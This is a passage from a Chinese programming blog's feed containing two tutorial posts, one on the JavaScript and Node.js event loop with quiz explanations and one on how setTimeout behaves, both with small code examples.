[‘A’, ‘B’]</li><li>函数返回一个 Promise，因为这是一个同步操作，所以先打印出 ‘C’</li><li>接着将 then 放到微任务队列，此时微任务队列为 [‘D’]</li><li>接着执行同步任务 console.log(‘E’);，打印出 ‘E’</li><li>因为微任务优先执行，所以先输出 ‘D’</li><li>最后依次输出 ‘A’ 和 ‘B’</li></ul><p><strong>测试题02</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">  resolve(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">Promise</span>.resolve().then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="number">2</span>));</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">4</span>);</span><br><span class="line">&#125;).then(<span class="function"><span class="params">t</span> =&gt;</span> <span class="built_in">console</span>.log(t));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">3</span>);</span><br></pre></td></tr></table></figure><ul><li>首先将 Promise.resolve() 的 then() 方法放到微任务队列，此时微任务队列为 [‘2’]</li><li>然后打印出同步任务 4</li><li>接着将 p 的 then() 方法放到微任务队列，此时微任务队列为 [‘2’, ‘1’]</li><li>打印出同步任务 3</li><li>最后依次打印微任务 2 和 1</li></ul><p><strong>测试题03</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// await 前面的代码</span></span><br><span class="line">  <span class="keyword">await</span> bar();</span><br><span class="line">  <span class="comment">// await 后面的代码</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// do something...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><p>async/await 仅仅是生成器的语法糖，只要把它转换成 Promise 的形式即可。</p><p>其中 await 前面的代码 是同步的，调用此函数时会直接执行；而 await bar(); 这句可以被转换成 Promise.resolve(bar())；await 后面的代码 则会被放到 Promise 的 then() 方法里。因此上面的代码可以被转换成如下形式，这样是不是就很清晰了？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// await 前面的代码</span></span><br><span class="line">  <span class="built_in">Promise</span>.resolve(bar()).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// await 后面的代码</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// do something...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><h3 id="NodeJS的Event-Loop"><a href="#NodeJS的Event-Loop" class="headerlink" title="NodeJS的Event Loop"></a>NodeJS的Event Loop</h3><p>Node.js也是单线程的Event Loop，但是它的运行机制不同于浏览器环境。</p><p><img src="/2019/04/28/Event Loop/node-event-loop.png" alt="node-event-loop"></p><p><code>Node</code> 中的 <code>Event Loop</code> 和浏览器中的是完全不相同的东西。<code>Node.js</code>采用<code>V8</code>作为js的解析引擎，而<code>I/O</code>处理方面使用了自己设计的<code>libuv</code>，<code>libuv</code>是一个基于事件驱动的跨平台抽象层，libuv使用异步，事件驱动的编程方式，核心是提供i/o的事件循环和异步回调。libuv的API包含有时间，非阻塞的网络，异步文件操作，子进程等等。 Event Loop就是在libuv中实现的。</p><p>Node.js的运行机制如下:</p><ul><li>V8引擎解析JavaScript脚本。</li><li>解析后的代码，调用Node API。</li><li>libuv库负责Node API的执行。它将不同的任务分配给不同的线程，形成一个Event Loop（事件循环），以异步的方式将任务的执行结果返回给V8引擎。</li><li>V8引擎再将结果返回给用户。</li></ul><p>Node的Event loop一共分为6个阶段，每个细节具体如下：</p><p><img src="/2019/04/28/Event Loop/node6.jpg" alt="node6"></p><ul><li><code>timers</code> 阶段：这个阶段执行<code>timer</code>（<code>setTimeout</code>、<code>setInterval</code>）中到期的回调</li><li><code>pending callback</code>: 上一轮循环中少数的callback会放在这一阶段执行。</li><li><code>idle, prepare</code> 阶段：仅node内部使用</li><li><code>poll</code> 阶段：获取新的<code>I/O</code>事件, 适当的条件下node将阻塞在这里</li><li><code>check</code> 阶段：执行 <code>setImmediate()</code> 的回调(<code>setImmediate()</code>是将事件插入到事件队列尾部，主线程和事件队列的函数执行完成之后立即执行<code>setImmediate</code>指定的回调函数)的<code>callback</code>。）</li><li><code>close callbacks</code> 阶段：执行 <code>socket</code> 的 <code>close</code> 事件回调，例如<code>socket.on(&#39;close&#39;[,fn])</code>或者<code>http.server.on(&#39;close, fn)</code>。</li></ul><p><strong>timers</strong></p><p>执行setTimeout和setInterval中到期的callback，并且是由 poll 阶段控制的，执行这两者回调需要设置一个毫秒数，理论上来说，应该是时间一到就立即执行callback回调，但是由于system的调度可能会延时，达不到预期时间，只能是尽快执行</p><p><strong>pending callbacks</strong></p><p>此阶段执行某些系统操作（例如TCP错误类型）的回调。 例如，如果TCP socket ECONNREFUSED在尝试connect时receives，则某些* nix系统希望等待报告错误。 这将在pending callbacks阶段执行。</p><p><strong>poll</strong></p><p>该poll阶段有两个主要功能：</p><ul><li>执行I/O回调。</li><li>处理轮询队列中的事件。</li></ul><p>当事件循环进入poll阶段并且在timers中没有可以执行定时器时，将发生以下两种情况之一</p><ul><li>如果poll队列不为空，则事件循环将遍历其同步执行它们的callback队列，直到队列为空，或者达到system-dependent（系统相关限制）。</li></ul><p>如果poll队列为空，则会发生以下两种情况之一</p><ul><li>如果有setImmediate()回调需要执行，则会立即停止执行poll阶段并进入执行check阶段以执行回调。</li><li>如果没有setImmediate()回到需要执行，poll阶段将等待callback被添加到队列中，然后立即执行。</li></ul><p>当然设定了 timer 的话且 poll 队列为空，则会判断是否有 timer 超时，如果有的话会回到 timer 阶段执行回调。</p><p><strong>check</strong></p><p>此阶段允许人员在poll阶段完成后立即执行回调。</p><p>如果poll阶段闲置并且script已排队setImmediate()，则事件循环到达check阶段执行而不是继续等待。</p><p>setImmediate()实际上是一个特殊的计时器，它在事件循环的一个单独阶段运行。它使用libuv API来调度在poll阶段完成后执行的回调。</p><p>通常，当代码被执行时，事件循环最终将达到poll阶段，它将等待传入连接，请求等。<br>但是，如果已经调度了回调setImmediate()，并且轮询阶段变为空闲，则它将结束并且到达check阶段，而不是等待poll事件。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">'start'</span>)</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'timer1'</span>)</span><br><span class="line">  <span class="built_in">Promise</span>.resolve().then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'promise1'</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;, <span class="number">0</span>)</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'timer2'</span>)</span><br><span class="line">  <span class="built_in">Promise</span>.resolve().then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'promise2'</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">Promise</span>.resolve().then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'promise3'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'end'</span>)</span><br></pre></td></tr></table></figure><p>如果node版本为v11.x， 其结果与浏览器一致。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">start</span><br><span class="line">end</span><br><span class="line">promise3</span><br><span class="line">timer1</span><br><span class="line">promise1</span><br><span class="line">timer2</span><br><span class="line">promise2</span><br></pre></td></tr></table></figure></p><p>如果v10版本上述结果存在两种情况：</p><ul><li><p>如果time2定时器已经在执行队列中了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">start</span><br><span class="line">end</span><br><span class="line">promise3</span><br><span class="line">timer1</span><br><span class="line">timer2</span><br><span class="line">promise1</span><br><span class="line">promise2</span><br></pre></td></tr></table></figure></li><li><p>如果time2定时器没有在执行对列中，执行结果为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">start</span><br><span class="line">end</span><br><span class="line">promise3</span><br><span class="line">timer1</span><br><span class="line">promise1</span><br><span class="line">timer2</span><br><span class="line">promise2</span><br></pre></td></tr></table></figure></li></ul><p>具体情况可以参考poll阶段的两种情况。</p><p>从下图可能更好理解：<br><img src="/2019/04/28/Event Loop/poll.jpg" alt="poll"></p><p><strong>setImmediate() 的setTimeout()的区别</strong></p><p>setImmediate和setTimeout()是相似的，但根据它们被调用的时间以不同的方式表现。</p><ul><li>setImmediate()设计用于在当前poll阶段完成后check阶段执行脚本 。</li><li>setTimeout() 安排在经过最小（ms）后运行的脚本，在timers阶段执行。</li></ul><p>举个例子:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'timeout'</span>);</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">setImmediate(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'immediate'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>执行定时器的顺序将根据调用它们的上下文而有所不同。 如果从主模块中调用两者，那么时间将受到进程性能的限制。</p><p>其结果也不一致</p><p>如果在I / O周期内移动两个调用，则始终首先执行立即回调：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line">fs.readFile(__filename, () =&gt; &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'timeout'</span>);</span><br><span class="line">  &#125;, <span class="number">0</span>);</span><br><span class="line">  setImmediate(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'immediate'</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>其结果可以确定一定是immediate =&gt; timeout。<br>主要原因是在I/O阶段读取文件后，事件循环会先进入poll阶段，发现有setImmediate需要执行，会立即进入check阶段执行setImmediate的回调。<br>然后再进入timers阶段，执行setTimeout，打印timeout。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">  ┌───────────────────────────┐</span><br><span class="line">┌─&gt;│           timers          │</span><br><span class="line">│  └─────────────┬─────────────┘</span><br><span class="line">│  ┌─────────────┴─────────────┐</span><br><span class="line">│  │     pending callbacks     │</span><br><span class="line">│  └─────────────┬─────────────┘</span><br><span class="line">│  ┌─────────────┴─────────────┐</span><br><span class="line">│  │       idle, prepare       │</span><br><span class="line">│  └─────────────┬─────────────┘      ┌───────────────┐</span><br><span class="line">│  ┌─────────────┴─────────────┐      │   incoming:   │</span><br><span class="line">│  │           poll            │&lt;─────┤  connections, │</span><br><span class="line">│  └─────────────┬─────────────┘      │   data, etc.  │</span><br><span class="line">│  ┌─────────────┴─────────────┐      └───────────────┘</span><br><span class="line">│  │           check           │</span><br><span class="line">│  └─────────────┬─────────────┘</span><br><span class="line">│  ┌─────────────┴─────────────┐</span><br><span class="line">└──┤      close callbacks      │</span><br><span class="line">   └───────────────────────────┘</span><br></pre></td></tr></table></figure><p><strong>Process.nextTick()</strong></p><p>process.nextTick()虽然它是异步API的一部分，但未在图中显示。这是因为process.nextTick()从技术上讲，它不是事件循环的一部分。</p><ul><li>process.nextTick()方法将 callback 添加到next tick队列。 一旦当前事件轮询队列的任务全部完成，在next tick队列中的所有callbacks会被依次调用。</li></ul><p>换种理解方式：</p><ul><li>当每个阶段完成后，如果存在 nextTick 队列，就会清空队列中的所有回调函数，并且优先于其他 microtask 执行。</li></ul><p><strong>镇楼题答案</strong></p><ul><li>首先打印出 script start</li><li>接着将 settimeout 添加到宏任务队列，此时宏任务队列为 [‘settimeout’]</li><li>然后执行函数 async1，先打印出 async1 start，又因为 Promise.resolve(async2()) 是同步任务，所以打印出 async2，接着将 async1 end 添加到微任务队列，，此时微任务队列为 [‘async1 end’]</li><li>接着打印出 promise1，将 promise2 添加到微任务队列，，此时微任务队列为 [‘async1 end’, promise2]</li><li>打印出 script end</li><li>因为微任务优先级高于宏任务，所以先依次打印出 async1 end 和 promise2</li><li>最后打印出宏任务 settimeout</li></ul><p>参考：</p><p><a href="https://juejin.im/post/5a6547d0f265da3e283a1df7#heading-17" target="_blank" rel="noopener">从浏览器多进程到JS单线程，JS运行机制最全面的一次梳理</a><br><a href="https://juejin.im/post/5c3d8956e51d4511dc72c200#heading-26" target="_blank" rel="noopener">一次弄懂Event Loop</a><br><a href="https://juejin.im/post/5c337ae06fb9a049bc4cd218#heading-14" target="_blank" rel="noopener">浏览器与Node的事件循环(Event Loop)有何区别?</a><br><a href="https://juejin.im/post/5b73d7a6518825610072b42b#heading-6" target="_blank" rel="noopener">微任务、宏任务与Event-Loop</a><br><a href="https://juejin.im/post/5cbc0a9cf265da03b11f3505?utm_source=gold_browser_extension#heading-13" target="_blank" rel="noopener">最后一次搞懂 Event Loop</a><br><a href="https://juejin.im/post/5a6155126fb9a01cb64edb45#heading-10" target="_blank" rel="noopener">Event Loop的规范和实现</a><br><a href="https://juejin.im/post/5c9a43175188252d876e5903" target="_blank" rel="noopener">Eventloop不可怕，可怕的是遇上Promise</a>  </p></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;Event Loop&lt;/code&gt;即事件循环，是指浏览器或&lt;code&gt;Node&lt;/code&gt;的一种解决&lt;code&gt;javaScript&lt;/code&gt;单线程运行时不会阻塞的一种机制，也就是我们经常使用异步的原理。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Javascript" scheme="https://jiuylq.github.io/tags/Javascript/"/>
    
  </entry>
  
  <entry>
    <title>setTimeout你应该知道的秘密</title>
    <link href="https://jiuylq.github.io/2019/03/13/setTimeout/"/>
    <id>https://jiuylq.github.io/2019/03/13/setTimeout/</id>
    <published>2019-03-13T08:31:09.000Z</published>
    <updated>2019-04-07T05:23:49.305Z</updated>
    
    <content type="html"><![CDATA[<p>计时器<code>setTimeout</code>是我们经常会用到的，它用于在指定的毫秒数后调用函数或计算表达式。<br><a id="more"></a></p><the rest of contents | 余下全文><h2 id="setTimeout你应该知道的秘密"><a href="#setTimeout你应该知道的秘密" class="headerlink" title="setTimeout你应该知道的秘密"></a>setTimeout你应该知道的秘密</h2><p>计时器<code>setTimeout</code>是我们经常会用到的，它用于在指定的毫秒数后调用函数或计算表达式。</p><p>语法：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(code, millisec, args)</span><br></pre></td></tr></table></figure></p><p>注意：如果code为字符串，相当于执行<code>eval()</code>方法来执行code。著作权归作者所有。</p><h3 id="setTimeout原理"><a href="#setTimeout原理" class="headerlink" title="setTimeout原理"></a>setTimeout原理</h3><p>先来看一段代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> start = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"><span class="keyword">var</span> end = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">new</span> <span class="built_in">Date</span>() - start);</span><br><span class="line">&#125;,  <span class="number">500</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">new</span> <span class="built_in">Date</span>() - start &lt;= <span class="number">1000</span>) &#123;&#125;</span><br></pre></td></tr></table></figure></p><p>在上面的代码中，定义了一个<code>setTimeout</code>定时器，延时时间是500毫秒。你是不是觉得打印结果是： 500</p><p>可事实却是出乎你的意料，打印结果是这样的（也许你打印出来会不一样，但肯定会大于1000毫秒）：<br>这是为毛呢？</p><p>究其原因，这是因为 JavaScript是单线程执行的。也就是说，在任何时间点，有且只有一个线程在运行JavaScript程序，无法同一时候运行多段代码。</p><p>再来看看浏览器下的JavaScript。</p><p>浏览器的内核是多线程的，它们在内核控制下相互配合以保持同步，一个浏览器至少实现三个常驻线程：<code>JavaScript引擎线程</code>，<code>GUI渲染线程</code>，<code>浏览器事件触发线程</code>。  </p><ul><li><code>JavaScript引擎</code>是基于事件驱动单线程执行的，JavaScript引擎一直等待着任务队列中任务的到来，然后加以处理，浏览器无论什么时候都只有一个JavaScript线程在运行JavaScript程序。</li><li><code>GUI渲染线程</code>负责渲染浏览器界面，当界面需要重绘（Repaint）或由于某种操作引发回流(Reflow)时，该线程就会执行。但需要注意，GUI渲染线程与JavaScript引擎是互斥的，当JavaScript引擎执行时GUI线程会被挂起，GUI更新会被保存在一个队列中等到JavaScript引擎空闲时立即被执行。</li><li><code>事件触发线程</code>，当一个事件被触发时，该线程会把事件添加到待处理队列的队尾，等待JavaScript引擎的处理。这些事件可来自JavaScript引擎当前执行的代码块如setTimeout、也可来自浏览器内核的其他线程如鼠标点击、Ajax异步请求等，但由于JavaScript的单线程关系，所有这些事件都得排队等待JavaScript引擎处理（当线程中没有执行任何同步代码的前提下才会执行异步代码）。</li></ul><p>到这里，我们再来回顾一下最初的例子：</p><p>虽然setTimeout的延时时间是500毫秒，可是由于while循环的存在，只有当间隔时间大于1000毫秒时，才会跳出while循环，也就是说，在1000毫秒之前，while循环都在占据着JavaScript线程。也就是说，只有等待跳出while后，线程才会空闲下来，才会去执行之前定义的setTimeout。</p><p>最后 ，我们可以总结出，setTimeout只能保证在指定的时间后将任务(需要执行的函数)插入任务队列中等候，但是不保证这个任务在什么时候执行。一旦执行javascript的线程空闲出来，自行从队列中取出任务然后执行它。</p><p>因为javascript线程并没有因为什么耗时操作而阻塞，所以可以很快地取出排队队列中的任务然后执行它，也是这种队列机制，给我们制造一个异步执行的假象。  </p><h3 id="setTimeout的好搭档“0”"><a href="#setTimeout的好搭档“0”" class="headerlink" title="setTimeout的好搭档“0”"></a>setTimeout的好搭档“0”</h3><p>下面有一段代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">// statement</span></span><br><span class="line">&#125;, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></p><p>上面的代码表示立即执行。  </p><p>本意是立刻执行调用函数，但事实上，上面的代码并不是立即执行的，这是因为<code>setTimeout</code>有一个最小执行时间，当指定的时间小于该时间时，浏览器会用最小允许的时间作为setTimeout的时间间隔，也就是说即使我们把<code>setTimeout</code>的延迟时间设置为0，被调用的程序也没有马上启动。</p><p>不同的浏览器实际情况不同，IE8和更早的IE的时间精确度是15.6ms。不过，随着HTML5的出现，在高级版本的浏览器（Chrome、ie9+等），定义的最小时间间隔是不得低于4毫秒，如果低于这个值，就会自动增加，并且在2010年及之后发布的浏览器中采取一致。</p><p>所以说，当我们写为 <code>setTimeout(fn,0)</code> 的时候，实际是实现插队操作，要求浏览器“尽可能快”的进行回调，但是实际能多快就完全取决于浏览器了。</p><p>那<code>setTimeout(fn, 0)</code>有什么用处呢？其实用处就在于我们可以改变任务的执行顺序！因为浏览器会在执行完当前任务队列中的任务，再执行<code>setTimeout</code>队列中积累的的任务。</p><p>通过设置任务在延迟到0s后执行，就能改变任务执行的先后顺序，延迟该任务发生，使之异步执行。</p><p>来看一个网上很流行的例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">'#one input'</span>).onkeydown = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.querySelector(<span class="string">'#one span'</span>).innerHTML = <span class="keyword">this</span>.value;</span><br><span class="line">&#125;;   </span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">'#second input'</span>).onkeydown = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.querySelector(<span class="string">'#second span'</span>).innerHTML = <span class="built_in">document</span>.querySelector(<span class="string">'#second input'</span>).value;   &#125;, <span class="number">0</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当你往两个表单输入内容时，你会发现未使用setTimeout函数的只会获取到输入前的内容，而使用setTimeout函数的则会获取到输入的内容。</p><p>这是为什么呢？</p><p>因为当按下按键的时候，JavaScript 引擎需要执行 <code>keydown</code> 的事件处理程序，然后更新文本框的 value 值，这两个任务也需要按顺序来，事件处理程序执行时，更新 value值（是在<code>keypress</code>后）的任务则进入队列等待，所以我们在 <code>keydown</code> 的事件处理程序里是无法得到更新后的value的，而利用 <code>setTimeout(fn, 0)</code>，我们把取 value 的操作放入队列，放在更新 value 值以后，这样便可获取出文本框的值。</p><p>未使用setTimeout函数，执行顺序是：<code>onkeydown</code> =&gt; <code>onkeypress</code> =&gt; <code>onkeyup</code></p><p>使用setTimeout函数，执行顺序是：<code>onkeydown</code> =&gt; <code>onkeypress</code> =&gt; <code>function</code> =&gt; <code>onkeyup</code></p><p>虽然我们可以使用<code>keyup</code>来替代<code>keydown</code>，不过有一些问题，那就是长按时，<code>keyup</code>并不会触发。</p><p>长按时，keydown、keypress、keyup的调用顺序：<code>keydown</code> =&gt; <code>keypress</code> =&gt; <code>keydown</code> =&gt; <code>keypress</code> =&gt; <code>...</code> =&gt; <code>keyup</code></p><p>也就是说<code>keyup</code>只会触发一次，所以你无法用<code>keyup</code>来实时获取值。</p><p>我们还可以用<code>setImmediate()</code>来替代<code>setTimeout(fn,0)</code>：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">window</span>.setImmediate) &#123;   </span><br><span class="line">  <span class="built_in">window</span>.setImmediate = <span class="function"><span class="keyword">function</span>(<span class="params">func, args</span>)</span>&#123;   </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">window</span>.setTimeout(func, <span class="number">0</span>, args);   </span><br><span class="line">  &#125;;   </span><br><span class="line">  <span class="built_in">window</span>.clearImmediate = <span class="built_in">window</span>.clearTimeout;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>setImmediate()</code>方法用来把一些需要长时间运行的操作放在一个回调函数里，在浏览器完成后面的其他语句后，就立刻执行这个回调函数，必选的第一个参数<code>func</code>，表示将要执行的回调函数，它并不需要时间参数。</p><p>注意：目前只有IE10支持此方法，当然，在Nodejs中也可以调用此方法。</p><h3 id="setTimeout的一些秘密"><a href="#setTimeout的一些秘密" class="headerlink" title="setTimeout的一些秘密"></a>setTimeout的一些秘密</h3><p>1、setTimeout中回调函数的this</p><p>由于<code>setTimeout()</code> 方法是浏览器 window 对象提供的，因此第一个参数函数中的this其实是指向window对象，这跟变量的作用域有关。</p><p>看个例子：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  a: <span class="number">2</span>,</span><br><span class="line">  test: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>.a);</span><br><span class="line">    &#125;, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;   </span><br><span class="line">obj.test();  <span class="comment">//  1</span></span><br></pre></td></tr></table></figure></p><p>不过我们可以通过使用bind()方法来改变setTimeout回调函数里的this</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  a: <span class="number">2</span>,</span><br><span class="line">  test: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>.a);</span><br><span class="line">    &#125;.bind(<span class="keyword">this</span>), <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">obj.test();  <span class="comment">//  2</span></span><br></pre></td></tr></table></figure><p>相关文章：<a href="http://ghmagical.com/article/page/id/UPLfoGI9vJ91" target="_blank" 